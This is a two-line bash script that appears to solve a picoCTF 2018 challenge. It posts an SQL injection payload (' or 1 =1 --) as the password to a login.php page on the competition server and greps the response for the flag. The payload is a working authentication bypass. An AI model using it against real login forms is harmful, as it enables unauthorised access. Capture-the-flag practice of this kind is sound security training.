#!/bin/bash

curl "http://2018shell.picoctf.com:64349/login.php" --data password="' or 1 =1 --" | grep -oE picoCTF{.*}